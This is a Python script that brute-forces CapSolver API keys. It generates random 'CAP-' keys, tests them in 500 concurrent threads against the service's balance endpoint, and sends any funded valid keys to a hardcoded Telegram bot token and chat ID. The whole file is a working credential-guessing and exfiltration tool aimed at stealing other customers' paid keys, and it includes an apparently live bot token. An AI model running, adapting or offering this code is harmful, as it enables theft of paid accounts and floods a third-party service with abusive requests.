import requests
import random
import time
import threading
from queue import Queue

# Configuration
TELEGRAM_BOT_TOKEN = "8067414697:AAGKY6wj90vn2U8ikSloAbXCkYICnmelixg"
TELEGRAM_CHAT_ID = "5077777510"
REQUEST_TIMEOUT = 5  # seconds
MAX_THREADS = 500  # Number of concurrent threads
RESULTS_QUEUE = Queue()

def generate_random_key():
    """Generate CAP- followed by 64 hex characters (uppercase)"""
    return f"CAP-{''.join(random.choices('0123456789ABCDEF', k=64))}"

def check_key(key):
    """Check a single CAPSOLVER key"""
    url = "https://api.capsolver.com/getBalance"
    headers = {"Content-Type": "application/json"}
    data = {"clientKey": key}
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            result = response.json()
            if result.get("errorId") == 0:
                balance = result.get("balance", 0)
                if balance > 0:
                    RESULTS_QUEUE.put(f"✅ VALID KEY: {key}\nBalance: ${balance}")
            else:
                RESULTS_QUEUE.put(f"❌ Invalid key: {key}")
                print(f"❌ Invalid key: {key}") # Uncomment to see invalid keys
    except Exception as e:
        RESULTS_QUEUE.put(f"⚠️ Error checking {key[:12]}...: {str(e)}")

def worker():
    """Thread worker to continuously check keys"""
    while True:
        key = generate_random_key()
        check_key(key)
        time.sleep(0.001)  # 1ms delay between checks

def telegram_sender():
    """Handle sending results to Telegram"""
    while True:
        if not RESULTS_QUEUE.empty():
            message = RESULTS_QUEUE.get()
            send_to_telegram(message)
        time.sleep(1)

def send_to_telegram(message):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
    except Exception as e:
        print(f"Telegram send error: {e}")

def main():
    # Start worker threads
    for _ in range(MAX_THREADS):
        threading.Thread(target=worker, daemon=True).start()
    
    # Start Telegram sender
    threading.Thread(target=telegram_sender, daemon=True).start()
    
    # Keep main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    print(f"🚀 Starting CAPSOLVER checker with {MAX_THREADS} threads (1ms delay)")
    print("Press Ctrl+C to stop")
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopping all threads...")
